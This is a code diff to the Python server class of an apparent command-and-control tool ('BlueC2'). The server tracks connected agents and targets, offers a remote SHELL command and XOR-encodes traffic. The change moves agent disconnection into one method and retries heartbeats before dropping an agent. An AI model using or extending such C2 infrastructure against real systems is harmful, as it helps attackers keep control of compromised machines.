@@ -110,11 +110,7 @@ class BlueServer:
             agents = splits[1].split(",")
             for a in agents:
                 agent = self.agentnum_to_agent(a)
-                self.connections.remove(agent)
-                if agent in self.targets:
-                    self.targets.remove(agent)
-                agent.sock.shutdown(socket.SHUT_RDWR)
-                agent.sock.close()
+                self.disconnect_agent(agent)
         elif splits[0].upper() == "SHELL":
             agent = self.agentnum_to_agent(splits[1])
             if agent != None:
@@ -165,9 +161,7 @@ class BlueServer:
         except ConnectionError:
             print(str(agent) + "\nERROR: Connection Error\n")
             logging.error("Connection error:" + str(agent) + ":" + self.get_timestamp())
-            agent.sock.close()
-            self.connections.remove(agent)
-            self.targets.remove(agent)
+            self.disconnect_agent(agent)
         except BrokenPipeError:
             print(str(agent) + "\nERROR: Broken pipe error\n")
             logging.error("Broken pipe error:" + str(agent) + ":" + self.get_timestamp())
@@ -195,8 +189,7 @@ class BlueServer:
         self.running = False
         for conn in self.connections:
             try:
-                conn.sock.shutdown(socket.SHUT_RDWR)
-                conn.sock.close()
+                self.disconnect_agent(conn)
             except:
                 continue
         logging.info("BlueC2 Server Shutdown:"+self.get_timestamp())
@@ -263,6 +256,9 @@ class BlueServer:
     def send_heartbeat(self,agent):
         if agent.is_locked():
             return
+        if agent.sock == None:
+            self.disconnect_agent(agent)
+            return
         try:
             reply = ""
             agent.lock()
@@ -272,20 +268,34 @@ class BlueServer:
                 logging.warning("Lost connection to " + agent.ip[0]+":"+self.get_timestamp())
                 self.connections.remove(agent)
         except socket.timeout:
-            logging.warning("Lost connection to " + agent.ip[0]+"(timeout):"+self.get_timestamp())
-            print("Agent " + str(agent.number) + " timed out, removing from connections")
-            self.connections.remove(agent)
+            agent.no_response_count+=1
         except Exception as e:
             logging.error("Error sending heartbeat:"+str(e)+":"+self.get_timestamp())
-            self.connections.remove(agent)
+            agent.no_response_count+=1
         finally:
             agent.unlock()
+            if agent.no_response_count > 3:
+                self.disconnect_agent(agent)
+                agent.no_response_count = 0
     
     def heartbeat_all_conns(self):
         while self.running == True:
             for conn in self.connections:
                 self.send_heartbeat(conn)
                 time.sleep(60) #pauses for one minute
+
+    def disconnect_agent(self,agent):
+        logging.warning("Lost connection to " + agent.ip[0]+"(timeout):"+self.get_timestamp())
+        print("Agent " + str(agent.number) + " timed out, removing from connections")
+        self.connections.remove(agent)
+        try:
+            agent.sock.shutdown(socket.SHUT_RDWR)
+            agent.sock.close()
+        except:
+            pass
+        if agent in self.targets:
+            self.targets.remove(agent)
+
                 
     def xor(self, data, key):
         return bytes([a ^ b for a, b in zip(data, key)])
